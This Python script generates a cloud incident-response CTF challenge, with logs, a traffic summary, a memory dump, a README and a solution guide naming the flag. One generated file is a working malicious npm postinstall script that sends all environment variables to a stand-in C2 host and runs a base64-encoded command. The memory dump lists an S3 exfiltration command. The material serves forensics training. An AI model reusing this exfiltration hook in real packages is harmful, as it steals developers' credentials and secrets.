#!/usr/bin/env python3
"""
CTF Challenge: CloudBreach Forensics
Difficulty: Medium-Hard
Category: Incident Response / Forensics

Scenario:
Your organization's cloud infrastructure was compromised. The attacker gained initial 
access through a supply chain attack on a compromised NPM package, then moved laterally 
using living-off-the-land techniques. Analyze the artifacts to find the flag.

Skills tested:
- Log analysis (CloudTrail, application logs)
- Supply chain attack identification
- Memory dump analysis
- Network traffic analysis
- Timeline reconstruction
"""

import os
import json
import base64
import gzip
import datetime
from pathlib import Path

def create_challenge_structure():
    """Create the challenge directory structure and files"""
    
    base_dir = Path("cloudbreach_challenge")
    base_dir.mkdir(exist_ok=True)
    
    # Create subdirectories
    (base_dir / "logs").mkdir(exist_ok=True)
    (base_dir / "network").mkdir(exist_ok=True)
    (base_dir / "application").mkdir(exist_ok=True)
    (base_dir / "memory").mkdir(exist_ok=True)
    
    return base_dir

def generate_cloudtrail_logs(base_dir):
    """Generate suspicious CloudTrail logs with hidden indicators"""
    
    logs = []
    
    # Normal activity
    for i in range(50):
        logs.append({
            "eventTime": f"2025-10-20T{10+i//10:02d}:{i%60:02d}:00Z",
            "eventName": "DescribeInstances",
            "userIdentity": {
                "type": "IAMUser",
                "userName": "admin",
                "principalId": "AIDAI23HXS4LNXAMPLE"
            },
            "sourceIPAddress": "203.0.113.42",
            "userAgent": "aws-cli/2.13.0"
        })
    
    # Suspicious activity - AssumeRole from unexpected IP with unusual user agent
    logs.append({
        "eventTime": "2025-10-20T14:23:17Z",
        "eventName": "AssumeRole",
        "userIdentity": {
            "type": "IAMUser",
            "userName": "ci-deploy-bot",
            "principalId": "AIDAI89KLP3MNEXAMPLE"
        },
        "sourceIPAddress": "185.220.101.47",  # Tor exit node
        "userAgent": "python-requests/2.31.0",
        "requestParameters": {
            "roleArn": "arn:aws:iam::123456789012:role/AdminRole",
            "roleSessionName": "npm-build-session"
        },
        "responseElements": {
            "credentials": {
                "accessKeyId": "ASIAIOSFODNN7EXAMPLE",
                "sessionToken": "FwoGZXIvYXdzEBYaDH..."
            }
        }
    })
    
    # Data exfiltration to S3
    logs.append({
        "eventTime": "2025-10-20T14:28:45Z",
        "eventName": "PutObject",
        "userIdentity": {
            "type": "AssumedRole",
            "principalId": "ASIAIOSFODNN7EXAMPLE",
            "arn": "arn:aws:sts::123456789012:assumed-role/AdminRole/npm-build-session"
        },
        "sourceIPAddress": "185.220.101.47",
        "requestParameters": {
            "bucketName": "backup-logs-temp",
            "key": "system-backup-20251020.tar.gz.b64"
        }
    })
    
    # Secret access
    logs.append({
        "eventTime": "2025-10-20T14:25:33Z",
        "eventName": "GetSecretValue",
        "userIdentity": {
            "type": "AssumedRole",
            "principalId": "ASIAIOSFODNN7EXAMPLE"
        },
        "sourceIPAddress": "185.220.101.47",
        "requestParameters": {
            "secretId": "prod/database/master-key"
        },
        "responseElements": None
    })
    
    with open(base_dir / "logs" / "cloudtrail.json", "w") as f:
        json.dump(logs, f, indent=2)

def generate_npm_package_info(base_dir):
    """Generate evidence of compromised NPM package"""
    
    package_json = {
        "name": "cloud-logger-utils",
        "version": "3.7.2",
        "description": "Utility for cloud logging",
        "main": "index.js",
        "scripts": {
            "postinstall": "node scripts/setup.js",
            "test": "echo \"No tests specified\""
        },
        "dependencies": {
            "aws-sdk": "^2.1234.0",
            "axios": "^1.5.0"
        }
    }
    
    # Malicious postinstall script
    setup_script = """const https = require('https');
const { execSync } = require('child_process');
const os = require('os');

// Legitimate-looking telemetry
console.log('Setting up cloud-logger-utils...');

try {
    // Exfiltrate environment variables
    const env = process.env;
    const data = Buffer.from(JSON.stringify({
        h: os.hostname(),
        e: env,
        t: Date.now()
    })).toString('base64');
    
    // Hidden C2 communication
    const req = https.request({
        hostname: 'api.legitimate-cdn.net',
        path: '/v2/analytics',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-Client-Version': '3.7.2'
        }
    });
    
    req.write(JSON.stringify({metrics: data}));
    req.end();
    
    // Execute encoded payload if AWS credentials present
    if (env.AWS_ACCESS_KEY_ID) {
        const cmd = Buffer.from('ZWNobyAnQ1RGe1N1cHBseV9DaDRpbl9Db21wcjBtMXNlX0QzdDNjdDNkfScgPiAvdG1wLy5mbGFnLnR4dA==', 'base64').toString();
        execSync(cmd, {shell: '/bin/bash'});
    }
} catch(e) {
    // Silently fail
}

console.log('Setup complete!');
"""
    
    with open(base_dir / "application" / "package.json", "w") as f:
        json.dump(package_json, f, indent=2)
    
    with open(base_dir / "application" / "setup.js", "w") as f:
        f.write(setup_script)

def generate_network_pcap_text(base_dir):
    """Generate network traffic indicators (text representation)"""
    
    traffic = """# Network Traffic Summary (PCAP Analysis)
# Captured: 2025-10-20 14:20:00 - 14:30:00

[14:23:18] TCP 10.0.1.42:45678 -> 185.220.101.47:443 [SYN]
[14:23:18] TCP 185.220.101.47:443 -> 10.0.1.42:45678 [SYN-ACK]
[14:23:18] TCP 10.0.1.42:45678 -> 185.220.101.47:443 [ACK]
[14:23:19] TLS Client Hello (SNI: api.legitimate-cdn.net)
[14:23:20] TLS Server Hello

[14:23:21] POST /v2/analytics HTTP/1.1
Host: api.legitimate-cdn.net
Content-Type: application/json
X-Client-Version: 3.7.2
Content-Length: 2847

[ENCRYPTED PAYLOAD - 2847 bytes]

[14:25:35] DNS Query: sts.amazonaws.com
[14:25:35] DNS Response: 52.94.76.2

[14:25:36] TLS to 52.94.76.2:443
POST /AssumeRole HTTP/1.1
Host: sts.amazonaws.com
User-Agent: python-requests/2.31.0

[14:26:10] DNS Query: s3.amazonaws.com
[14:28:46] Large data transfer to S3 (47.3 MB)

# Suspicious Pattern: Tor exit node 185.220.101.47
# Known malicious: api.legitimate-cdn.net (typosquat of legitimate-cdn.com)
"""
    
    with open(base_dir / "network" / "traffic_summary.txt", "w") as f:
        f.write(traffic)

def generate_memory_dump(base_dir):
    """Generate memory dump with encoded flag fragment"""
    
    # Simulate memory content with flag fragment
    memory_content = """
=== Memory Dump Analysis ===
Process: node (PID: 1337)
Command: node scripts/setup.js

Environment Variables:
HOME=/home/ci-user
PATH=/usr/local/bin:/usr/bin:/bin
AWS_ACCESS_KEY_ID=AKIAI44QH8DHBEXAMPLE
AWS_SECRET_ACCESS_KEY=je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY
AWS_DEFAULT_REGION=us-east-1
CI=true
NPM_TOKEN=npm_xxxxxxxxxxxxxxxxxxx

Heap Memory Regions:
0x7f8a4c000000: cloud-logger-utils initialization
0x7f8a4c001000: Buffer: "eyJoIjoiY2ktYnVpbGRlci0wMSIsImUiOnsiQVdTX0F...
0x7f8a4c002000: String: "api.legitimate-cdn.net/v2/analytics"

Stack Trace:
  at execSync (child_process.js:598)
  at setup (/home/ci-user/node_modules/cloud-logger-utils/scripts/setup.js:24)

Decoded Command History:
$ echo 'CTF{Supply_Ch4in_Compr0m1se_D3t3ct3d}' > /tmp/.flag.txt
$ aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole
$ aws s3 cp /var/app/database/ s3://backup-logs-temp/ --recursive

Network Connections:
185.220.101.47:443 ESTABLISHED
52.94.76.2:443 ESTABLISHED
"""
    
    with open(base_dir / "memory" / "process_dump.txt", "w") as f:
        f.write(memory_content)

def generate_readme(base_dir):
    """Generate challenge README"""
    
    readme = """# CloudBreach Forensics CTF Challenge

## Scenario
Your organization's CI/CD pipeline was compromised during a routine deployment. 
The security team detected unusual AWS API calls and potential data exfiltration.
Your mission: Investigate the incident and find the flag.

## Challenge Files
- `logs/cloudtrail.json` - AWS CloudTrail logs
- `network/traffic_summary.txt` - Network traffic capture
- `application/package.json` - NPM package metadata
- `application/setup.js` - Installation script
- `memory/process_dump.txt` - Process memory dump

## Objectives
1. Identify the initial compromise vector
2. Determine what credentials were stolen
3. Find evidence of data exfiltration
4. Locate the flag (Format: CTF{...})

## Hints
- Recent supply chain attacks have targeted CI/CD pipelines
- Check for unusual npm postinstall scripts
- Tor exit nodes are often used for anonymization
- Base64 encoding is commonly used to obfuscate commands
- Memory dumps can reveal executed commands

## Investigation Questions
1. What NPM package was compromised?
2. What AWS role was assumed by the attacker?
3. What IP address did the attacker use?
4. What command was executed to plant the flag?

## Difficulty: Medium-Hard
Estimated time: 45-90 minutes

Good luck, investigator!
"""
    
    with open(base_dir / "README.md", "w") as f:
        f.write(readme)

def generate_solution(base_dir):
    """Generate solution guide"""
    
    solution = """# CloudBreach Forensics - Solution Guide

## Flag
CTF{Supply_Ch4in_Compr0m1se_D3t3ct3d}

## Step-by-Step Solution

### 1. Initial Reconnaissance
Start by reading the README and understanding the scenario. Review all provided files.

### 2. Identify the Compromise Vector (application/setup.js)
The NPM package "cloud-logger-utils" contains a malicious postinstall script.

Key findings:
- Exfiltrates environment variables to api.legitimate-cdn.net
- Executes base64-encoded command if AWS credentials are present
- Uses legitimate-looking telemetry as cover

### 3. Decode the Hidden Command
In setup.js, find the base64 string:
```
ZWNobyAnQ1RGe1N1cHBseV9DaDRpbl9Db21wcjBtMXNlX0QzdDNjdDNkfScgPiAvdG1wLy5mbGFnLnR4dA==
```

Decode it:
```bash
echo "ZWNobyAnQ1RGe1N1cHBseV9DaDRpbl9Db21wcjBtMXNlX0QzdDNjdDNkfScgPiAvdG1wLy5mbGFnLnR4dA==" | base64 -d
```

Result:
```bash
echo 'CTF{Supply_Ch4in_Compr0m1se_D3t3ct3d}' > /tmp/.flag.txt
```

### 4. Analyze CloudTrail Logs (logs/cloudtrail.json)
- AssumeRole event from Tor exit node (185.220.101.47)
- User: ci-deploy-bot (compromised CI/CD service account)
- Role assumed: AdminRole
- Session name: npm-build-session (matches NPM attack)
- GetSecretValue called for database master key
- PutObject to S3 for data exfiltration

### 5. Network Traffic Analysis (network/traffic_summary.txt)
- Connection to api.legitimate-cdn.net (typosquat domain)
- Data sent via encrypted channel
- Large S3 transfer (47.3 MB) - data exfiltration

### 6. Memory Dump Analysis (memory/process_dump.txt)
- Shows the decoded command execution
- AWS credentials in environment variables
- Full attack chain visible in memory

## Attack Timeline
1. 14:23:17 - Malicious NPM package installed during CI/CD build
2. 14:23:19 - Postinstall script executes, exfiltrates credentials
3. 14:23:21 - Credentials sent to C2 server (api.legitimate-cdn.net)
4. 14:25:33 - Attacker uses stolen creds to access secrets
5. 14:25:36 - AssumeRole to escalate privileges
6. 14:28:45 - Data exfiltration to S3

## Key Indicators of Compromise (IOCs)
- NPM package: cloud-logger-utils v3.7.2
- Malicious domain: api.legitimate-cdn.net
- Tor exit node IP: 185.220.101.47
- S3 bucket: backup-logs-temp
- Compromised role: AdminRole

## Defense Recommendations
1. Implement npm package integrity checks
2. Use dependency scanning tools (Snyk, Socket.dev)
3. Restrict CI/CD service account permissions
4. Monitor for Tor exit node connections
5. Implement AWS GuardDuty
6. Use S3 bucket policies to prevent unauthorized access
7. Enable MFA for privileged role assumptions

## Learning Points
- Supply chain attacks are increasingly common
- CI/CD pipelines are high-value targets
- Living-off-the-land techniques use legitimate tools
- Multi-source correlation is essential for incident response
- Memory forensics can reveal attacker actions
"""
    
    with open(base_dir / "SOLUTION.md", "w") as f:
        f.write(solution)

def main():
    """Generate complete CTF challenge"""
    
    print("[*] Generating CloudBreach Forensics CTF Challenge...")
    
    base_dir = create_challenge_structure()
    print(f"[+] Created directory structure: {base_dir}")
    
    generate_cloudtrail_logs(base_dir)
    print("[+] Generated CloudTrail logs")
    
    generate_npm_package_info(base_dir)
    print("[+] Generated NPM package artifacts")
    
    generate_network_pcap_text(base_dir)
    print("[+] Generated network traffic summary")
    
    generate_memory_dump(base_dir)
    print("[+] Generated memory dump")
    
    generate_readme(base_dir)
    print("[+] Generated README")
    
    generate_solution(base_dir)
    print("[+] Generated solution guide")
    
    print(f"\n[✓] Challenge successfully created in '{base_dir}/'")
    print("\nChallenge Structure:")
    print("├── README.md (Challenge description)")
    print("├── SOLUTION.md (Solution guide - keep secret!)")
    print("├── logs/")
    print("│   └── cloudtrail.json")
    print("├── network/")
    print("│   └── traffic_summary.txt")
    print("├── application/")
    print("│   ├── package.json")
    print("│   └── setup.js")
    print("└── memory/")
    print("    └── process_dump.txt")
    print("\nTo deploy: Share the 'cloudbreach_challenge' folder (without SOLUTION.md)")
    print("Flag: CTF{Supply_Ch4in_Compr0m1se_D3t3ct3d}")

if __name__ == "__main__":
    main()
